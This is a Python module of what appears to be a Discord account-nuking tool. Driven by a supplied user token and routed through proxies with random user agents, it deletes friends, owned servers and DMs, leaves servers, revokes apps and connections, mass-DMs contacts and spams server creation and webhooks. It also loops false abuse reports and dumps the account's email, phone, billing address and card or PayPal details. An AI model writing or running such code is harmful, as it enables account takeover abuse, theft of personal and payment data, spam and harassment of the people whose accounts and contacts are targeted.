import time
import datetime
import random
import requests
import user_agent
import concurrent.futures
from pystyle import *
import utils.stuff as stuff

def delete_friends(token):
    ua = user_agent.generate_user_agent()
    headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': ua}
    fr_list = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers, proxies=stuff.proxy())
    if fr_list.status_code == 200:
        ids = [int(id['id']) for id in fr_list.json() if id['type'] == 1]
    else:
        stuff.vanguard_print("-", f"-{fr_list.status_code}- Couldn't get friend list.\n")
        return
    if not ids:
        stuff.vanguard_print("!", "No friends to delete.\n")
        return
    for id in ids:
        frd = requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{id}', headers=headers, proxies=stuff.proxy())
        if frd.status_code == 204:
            stuff.vanguard_print("+", f"Deleted friend: {id}\n")
        else:
            stuff.vanguard_print("-", f"-{frd.status_code}- Couldn't delete friend: {id}\n")
    stuff.vanguard_print("#", "Action completed.")

def delete_guilds(token):
    # check if token got 2fa enabled
    ua = user_agent.generate_user_agent()
    headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': ua}
    r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, proxies=stuff.proxy())
    if r.status_code == 200:
        r = r.json()
        if r['mfa_enabled']:
            stuff.vanguard_print("!", "2FA enabled, can't delete guilds.\n")
            return
    else:
        stuff.vanguard_print("-", f"-{r.status_code}- Couldn't get user info.\n")
        return
    # get guild ids which user owns
    guilds = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers, proxies=stuff.proxy())
    if guilds.status_code == 200:
        ids = [int(id['id']) for id in guilds.json() if id['owner'] == True]
    else:
        stuff.vanguard_print("-", f"-{guilds.status_code}- Couldn't get guild list.\n")
        return
    if not ids:
        stuff.vanguard_print("!", "No guilds to delete.\n")
        return
    for id in ids:
        payload = {}
        guild = requests.post(f'https://discord.com/api/v9/guilds/{id}/delete', headers=headers, json=payload, proxies=stuff.proxy())
        if guild.status_code == 204:
            stuff.vanguard_print("+", f"Deleted guild: {id}\n")
        else:
            stuff.vanguard_print("-", f"-{guild.status_code}- Couldn't delete guild: {id}\n")
    stuff.vanguard_print("#", "Action completed.")

def leave_guilds(token):
    ua = user_agent.generate_user_agent()
    headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': ua}
    # get guild ids which user doesnt own
    guilds = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers, proxies=stuff.proxy())
    if guilds.status_code == 200:
        ids = [int(id['id']) for id in guilds.json() if id['owner'] == False]
    else:
        stuff.vanguard_print("-", f"-{guilds.status_code}- Couldn't get guild list.\n")
        return
    if not ids:
        stuff.vanguard_print("!", "No servers to leave.\n")
        return
    for id in ids:
        payload = {'lurking': False}
        guild = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{id}", headers=headers, json=payload, proxies=stuff.proxy())
        if guild.status_code == 204:
            stuff.vanguard_print("+", f"Left server: {id}\n")
        else:
            stuff.vanguard_print("-", f"-{guild.status_code}- Couldn't leave server: {id}\n")
    stuff.vanguard_print("#", "Action completed.")

def spam_guilds(token, name=None, guild_icon=None):
    ua = user_agent.generate_user_agent()
    headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': ua}
    if not name:
        name = ''.join(random.choice([chr(i) for i in range(0x4e00, 0x9fff)]) for _ in range(random.randint(2, 100)))
    if not guild_icon:
        guild_icon = None
    else:
        # send request to get guild icon
        r = requests.get(guild_icon)
        if r.status_code == 200:
            import base64
            img_base64 = base64.b64encode(r.content).decode('utf-8')
            guild_icon = f"data:image/png;base64,{img_base64}"
        else:
            guild_icon = None
    
    r = requests.post('https://discord.com/api/v9/guilds', headers=headers, json={'name': name, 'icon': guild_icon}, proxies=stuff.proxy())
    if r.status_code == 201:
        stuff.vanguard_print("+", f"Created guild: {r.json()['id']}\n")
    else:
        stuff.vanguard_print("-", f"-{r.status_code}- Couldn't create guild.\n")

def delete_dms(token):
    # get dm channel ids
    ua = user_agent.generate_user_agent()
    headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': ua}
    r = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers, proxies=stuff.proxy())
    if r.status_code == 200:
        ids = [int(id['id']) for id in r.json()]
    else:
        stuff.vanguard_print("-", f"-{r.status_code}- Couldn't get dm list.\n")
        return
    if not ids:
        stuff.vanguard_print("!", "No dms to delete.\n")
        return
    for id in ids:
        dm = requests.delete(f'https://discord.com/api/v9/channels/{id}', headers=headers, proxies=stuff.proxy())
        if dm.status_code == 200:
            stuff.vanguard_print("+", f"Deleted dm: {id}\n")
        else:
            stuff.vanguard_print("-", f"-{dm.status_code}- Couldn't delete dm: {id}\n")
    stuff.vanguard_print("#", "Action completed.")

def mass_dm(token, message, choice):
    # get user ids
    ua = user_agent.generate_user_agent()
    headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': ua}
    if choice == "f":
        r = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers, proxies=stuff.proxy())
        if r.status_code == 200:
            ids = [int(id['id']) for id in r.json()]
        else:
            stuff.vanguard_print("-", f"-{r.status_code}- Couldn't get friend list.\n")
            return
        if not ids:
            stuff.vanguard_print("!", "No friends to dm.\n")
            return
        for id in ids:
            # open dm channel and send message
            payload = {'recipient_id': id}
            dm = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers, json=payload, proxies=stuff.proxy())
            if dm.status_code == 200:
                payload = {'content': message}
                dm = requests.post(f'https://discord.com/api/v9/channels/{dm.json()["id"]}/messages', headers=headers, json=payload, proxies=stuff.proxy())
                if dm.status_code == 200:
                    stuff.vanguard_print("+", f"Sent dm to: {id}\n")
                else:
                    stuff.vanguard_print("-", f"-{dm.status_code}- Couldn't send dm to: {id}\n")
            else:
                stuff.vanguard_print("-", f"-{dm.status_code}- Couldn't open dm channel with: {id}\n")
        stuff.vanguard_print("#", "Action completed.")
        return
    elif choice == "d":
        r = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers, proxies=stuff.proxy())
        if r.status_code == 200:
            ids = [int(id['id']) for id in r.json()]
        else:
            stuff.vanguard_print("-", f"-{r.status_code}- Couldn't get dm list.\n")
            return
        if not ids:
            stuff.vanguard_print("!", "No dms to dm.\n")
            return
        for id in ids:
            payload = {'content': message}
            dm = requests.post(f'https://discord.com/api/v9/channels/{id}/messages', headers=headers, json=payload, proxies=stuff.proxy())
            if dm.status_code == 200:
                stuff.vanguard_print("+", f"Sent dm to: {id}\n")
            else:
                stuff.vanguard_print("-", f"-{dm.status_code}- Couldn't send dm to: {id}\n")
        stuff.vanguard_print("#", "Action completed.")
        return

def frenzy_mode(token):
    # keep switching light mode and dark mode and changing languages
    ua = user_agent.generate_user_agent()
    headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': ua}
    setting = {'theme': random.choice(['dark', 'light']), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
    requests.patch("https://discord.com/api/v7/users/@me/settings", proxies=stuff.proxy(), headers=headers, json=setting)

def get_information(token):
    ua = user_agent.generate_user_agent()
    headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': ua}
    r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, proxies=stuff.proxy())
    # get account age and convert to readable format
    fake = datetime.datetime.fromtimestamp(((int(r.json()['id']) >> 22) + 1420070400000) / 1000)
    fake = fake.strftime("%d/%m/%Y %H:%M:%S")
    # check if avatar is there and if there get the url if animated or not
    if r.json()['avatar'] is not None:
        if r.json()['avatar'].startswith("a_"):
            avatar = f"https://cdn.discordapp.com/avatars/{r.json()['id']}/{r.json()['avatar']}.gif"
        else:
            avatar = f"https://cdn.discordapp.com/avatars/{r.json()['id']}/{r.json()['avatar']}.png"
    else:
        avatar = "None"
    # check if banner is there and if there get the url if animated or not
    if r.json()['banner'] is not None:
        if r.json()['banner'].startswith("a_"):
            banner = f"https://cdn.discordapp.com/banners/{r.json()['id']}/{r.json()['banner']}.gif"
        else:
            banner = f"https://cdn.discordapp.com/banners/{r.json()['id']}/{r.json()['banner']}.png"
    else:
        banner = "None"
    
    
    has_nitro = False
    res = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers, proxies=stuff.proxy())
    nitro_data = res.json()
    has_nitro = bool(len(nitro_data) > 0)
    if has_nitro:
        d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
        d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
        days_left = abs((d2 - d1).days)
    cc_digits = {
    'american express': '3',
    'visa': '4',
    'mastercard': '5',
    }
    billing_info = []
    for x in requests.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=headers, proxies=stuff.proxy()).json():
        y = x['billing_address']
        name = y['name']
        address_1 = y['line_1']
        address_2 = y['line_2']
        city = y['city']
        postal_code = y['postal_code']
        state = y['state']
        country = y['country']
        if x['type'] == 1:
            cc_brand = x['brand']
            cc_first = cc_digits.get(cc_brand)
            cc_last = x['last_4']
            cc_month = str(x['expires_month'])
            cc_year = str(x['expires_year'])
            data = {
                'Payment Type': 'Credit Card',
                'Valid': not x['invalid'],
                'CC Holder Name': name,
                'CC Brand': cc_brand.title(),
                'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                'Address 1': address_1,
                'Address 2': address_2 if address_2 else '',
                'City': city,
                'Postal Code': postal_code,
                'State': state if state else '',
                'Country': country,
                'Default Payment': x['default']
            }
        elif x['type'] == 2:
            data = {
                'Payment Type': 'PayPal',
                'Valid': not x['invalid'],
                'PayPal Name': name,
                'PayPal Email': x['email'],
                'Address 1': address_1,
                'Address 2': address_2 if address_2 else '',
                'City': city,
                'Postal Code': postal_code,
                'State': state if state else '',
                'Country': country,
                'Default Payment': x['default']
            }
        billing_info.append(data)
    Write.Print(Center.XCenter(f"<- Account Information ->"), color=stuff.get_theme(), interval=0.00)
    print("\n")
    Write.Print(f"Username: {r.json()['username']}#{r.json()['discriminator']}\n", color=stuff.get_theme(), interval=0.00)
    Write.Print(f"ID: {r.json()['id']}\n", color=stuff.get_theme(), interval=0.00)
    Write.Print(f"Verified: {r.json()['verified']}\n", color=stuff.get_theme(), interval=0.00)
    Write.Print(f"Avatar: {avatar}\n", color=stuff.get_theme(), interval=0.00)
    Write.Print(f"Banner: {banner}\n", color=stuff.get_theme(), interval=0.00)
    Write.Print(f"Account Created: {fake}\n", color=stuff.get_theme(), interval=0.00)
    Write.Print(f"Language: {r.json()['locale']}\n", color=stuff.get_theme(), interval=0.00)
    Write.Print(f"Token: {token}\n", color=stuff.get_theme(), interval=0.00)
    print("\n")
    Write.Print(Center.XCenter(f"<- Security Information ->"), color=stuff.get_theme(), interval=0.00)
    print("\n")
    Write.Print(f"2FA: {r.json()['mfa_enabled']}\n", color=stuff.get_theme(), interval=0.00)
    Write.Print(f"Phone: {r.json()['phone']}\n", color=stuff.get_theme(), interval=0.00)
    Write.Print(f"Email: {r.json()['email']}\n", color=stuff.get_theme(), interval=0.00)
    print("\n")
    Write.Print(Center.XCenter(f"<- Nitro Information ->"), color=stuff.get_theme(), interval=0.00)
    print("\n")
    Write.Print(f"Nitro Status: {has_nitro}\n", color=stuff.get_theme(), interval=0.00)
    Write.Print(f'Expires in: {days_left if has_nitro else "0"} day(s)', color=stuff.get_theme(), interval=0.00)
    print("\n")
    if len(billing_info) > 0:
        Write.Print(Center.XCenter(f"<- Billing Information ->"), color=stuff.get_theme(), interval=0.00)
        print("\n")
        if len(billing_info) == 1:
            for x in billing_info:
                for key, val in x.items():
                    if not val:
                        continue
                    Write.Print(f"{key}: {val}\n", color=stuff.get_theme(), interval=0.00)
        else:
            for i, x in enumerate(billing_info):
                title = f'Payment Method #{i + 1} ({x["Payment Type"]})'
                print('' + title)
                print('' + ('=' * len(title)))
                for j, (key, val) in enumerate(x.items()):
                    if not val or j == 0:
                        continue
                    Write.Print(f"{key}: {val}\n", color=stuff.get_theme(), interval=0.00)
                if i < len(billing_info) - 1:
                    print('')
    Write.Input("Press enter to continue...", color=stuff.get_theme(), interval=0.00)

def deauth_apps(token):
    ua = user_agent.generate_user_agent()
    apps = requests.get("https://discord.com/api/v9/oauth2/tokens", headers={"authorization": token, "User-Agent": ua, "Content-Type": "application/json"}, proxies=stuff.proxy())
    if apps.status_code == 200:
        ids = [int(i["id"]) for i in apps.json()]
    else:
        stuff.vanguard_print("-", f"-{apps.status_code}- Couldn't get apps.\n")
        return
    if not ids:
        stuff.vanguard_print("!", "No apps to deauthorize.\n")
        return
    for i in ids:
        r = requests.delete(f"https://discord.com/api/v9/oauth2/tokens/{i}", headers={"authorization": token, "User-Agent": ua, "Content-Type": "application/json"}, proxies=stuff.proxy())
        if r.status_code == 204:
            stuff.vanguard_print("+", f"Deauthorized app: {i}\n")
        else:
            stuff.vanguard_print("-", f"-{r.status_code}- Couldn't deauthorize app: {i}\n")
    stuff.vanguard_print("#", "Action completed.")



def disconnect_connections(token):
    ua = user_agent.generate_user_agent()
    connections = requests.get("https://discord.com/api/v9/users/@me/connections", headers={"authorization": token, "User-Agent": ua, "Content-Type": "application/json"}, proxies=stuff.proxy())
    if connections.status_code == 200:
        connections = [f"{i['type']}/{i['id']}" for i in connections.json()]
    else:
        stuff.vanguard_print("-", f"-{connections.status_code}- Couldn't get connections.\n")
        return
    if not connections:
        stuff.vanguard_print("!", "No connections to disconnect.\n")
        return
    for i in connections:
        r = requests.delete(f"https://discord.com/api/v9/users/@me/connections/{i}", headers={"authorization": token, "User-Agent": ua, "Content-Type": "application/json"}, proxies=stuff.proxy())
        if r.status_code == 204:
            stuff.vanguard_print("+", f"Disconnected connection: {i}\n")
        else:
            stuff.vanguard_print("-", f"-{r.status_code}- Couldn't disconnect connection: {i}\n")
    stuff.vanguard_print("#", "Action completed.")

def change_bio(token):
    ua = user_agent.generate_user_agent()
    bio = Write.Input("Enter your new bio: ", color=stuff.get_theme(), interval=0.00)
    print("\n")
    r = requests.patch("https://discord.com/api/v9/users/@me", headers={"authorization": token, "User-Agent": ua, "Content-Type": "application/json"}, json={"bio": bio}, proxies=stuff.proxy())
    if r.status_code == 200:
        stuff.vanguard_print("+", "Successfully changed bio.\n")
    else:
        stuff.vanguard_print("-", f"-{r.status_code}- Couldn't change bio.\n")
    stuff.vanguard_print("#", "Action completed.")

def change_status(token):
    ua = user_agent.generate_user_agent()
    status = Write.Input("Enter your new status: ", color=stuff.get_theme(), interval=0.00)
    print("\n")
    r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"authorization": token, "User-Agent": ua, "Content-Type": "application/json"}, json={"custom_status": {"text": status}}, proxies=stuff.proxy())
    if r.status_code == 200:
        stuff.vanguard_print("+", "Successfully changed status.\n")
    else:
        stuff.vanguard_print("-", f"-{r.status_code}- Couldn't change status.\n")
    stuff.vanguard_print("#", "Action completed.")

def change_hypesquad(token):
    ua = user_agent.generate_user_agent()
    hypesquad = input("Enter your new hypesquad house (bravery, brilliance, balance): ")
    print("\n")
    if hypesquad not in ["bravery", "brilliance", "balance"]:
        stuff.vanguard_print("-", "Invalid hypesquad house.\n")
        return
    house = {"bravery": 1, "brilliance": 2, "balance": 3}
    r = requests.post("https://discord.com/api/v9/hypesquad/online", headers={"authorization": token, "User-Agent": ua, "Content-Type": "application/json"}, json={"house_id": house[hypesquad]}, proxies=stuff.proxy())
    if r.status_code == 204:
        stuff.vanguard_print("+", "Successfully changed hypesquad house.\n")
    else:
        stuff.vanguard_print("-", f"-{r.status_code}- Couldn't change hypesquad house.\n")
    stuff.vanguard_print("#", "Action completed.")

def report(token, guild, channel, message, reason):
    ua = user_agent.generate_user_agent()
    responses = {
            '401: Unauthorized': 'Invalid token.',
            'Missing Access': 'Missing access to guild or channel.',
            'You need to verify your account in order to perform this action.': 'Account needs to be verified.'
    }
    report = requests.post('https://discordapp.com/api/v8/report', json={"channel_id": channel, "guild_id": guild, "message_id": message, "reason": reason}, headers={'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'sv-SE', 'User-Agent': 'Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0', 'Content-Type': 'application/json', 'Authorization': token})
    if (status := report.status_code) == 201:
        stuff.vanguard_print("+", "Sent report successfully.\n")
    elif status in (401, 403):
        stuff.vanguard_print("-", f"-{status}- {responses[report.json()['message']]}\n")
    else:
        stuff.vanguard_print("-", f"-{status}- Couldn't send report.\n")

def mass_report(token):
    guild = Write.Input("Enter guild id: ", color=stuff.get_theme(), interval=0.00)
    channel = Write.Input("Enter channel id: ", color=stuff.get_theme(), interval=0.00)
    message = Write.Input("Enter message id: ", color=stuff.get_theme(), interval=0.00)
    print("\n")
    reason = str(Write.Input(
            '\n1. Illegal content\n'
            '2. Harassment\n'
            '3. Spam or phishing links\n'
            '4. Self-harm\n'
            '5. NSFW content\n\n'
            'Enter reason: ', color=stuff.get_theme(), interval=0.00
    ))
    if reason not in ['1', '2', '3', '4', '5']:
        stuff.vanguard_print("-", "Invalid reason.\n")
        return
    print("\n")
    Write.Print("Press ", color=stuff.get_theme(), interval=0.00), Write.Print("CTRL+C", color=Colors.reset, interval=0.00), Write.Print(" to stop.\n", color=stuff.get_theme(), interval=0.00)
    print("\n")
    while True:
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                executor.submit(report, token, guild, channel, message, reason)
        except KeyboardInterrupt:
            stuff.vanguard_print("#", "Stopped mass reporting.\n")
            break

def webhook_spammer():
    ua = user_agent.generate_user_agent()
    webhook = Write.Input("Enter webhook url: ", color=stuff.get_theme(), interval=0.00)
    message = Write.Input("Enter message: ", color=stuff.get_theme(), interval=0.00)
    # validate webhook
    r = requests.get(webhook)
    if not r.status_code == 200:
        stuff.vanguard_print("-", f"-{r.status_code}- Invalid webhook.\n")
        return
    print("\n")
    Write.Print("Press ", color=stuff.get_theme(), interval=0.00), Write.Print("CTRL+C", color=Colors.reset, interval=0.00), Write.Print(" to stop.\n", color=stuff.get_theme(), interval=0.00)
    print("\n")
    while True:
        try:
            r = requests.post(webhook, json={"content": message}, params={"wait": True}, proxies=stuff.proxy())
            if r.status_code == 204 or r.status_code == 200:
                stuff.vanguard_print("+", "Successfully sent message.\n")
            elif r.status_code == 429:
                stuff.vanguard_print("-", f"Ratelimited for {r.json()['retry_after'] / 1000} seconds.\n")
                time.sleep(r.json()['retry_after'] / 1000)
            else:
                stuff.vanguard_print("-", f"-{r.status_code}- Couldn't send message.\n")
            time.sleep(0.01)
        except KeyboardInterrupt:
            stuff.vanguard_print("#", "Stopped webhook spammer.\n")
            break

def friend_nickname_changer(token):
    name = Write.Input("Enter new nickname: ", color=stuff.get_theme(), interval=0.00)
    ua = user_agent.generate_user_agent()
    headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': ua}
    fr_list = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers, proxies=stuff.proxy())
    if fr_list.status_code == 200:
        ids = [int(id['id']) for id in fr_list.json() if id['type'] == 1]
    else:
        stuff.vanguard_print("-", f"-{fr_list.status_code}- Couldn't get friend list.\n")
        return
    if not ids:
        stuff.vanguard_print("!", "No friends to change nickname of.\n")
        return
    for id in ids:
        r = requests.patch(f"https://discord.com/api/v9/users/@me/relationships/{id}", headers=headers, json={"nickname": name}, proxies=stuff.proxy())
        if r.status_code == 204:
            stuff.vanguard_print("+", f"Successfully changed nickname of {id}.\n")
        else:
            stuff.vanguard_print("-", f"-{r.status_code}- Couldn't change nickname of {id}.\n")
    stuff.vanguard_print("#", "Action completed.")
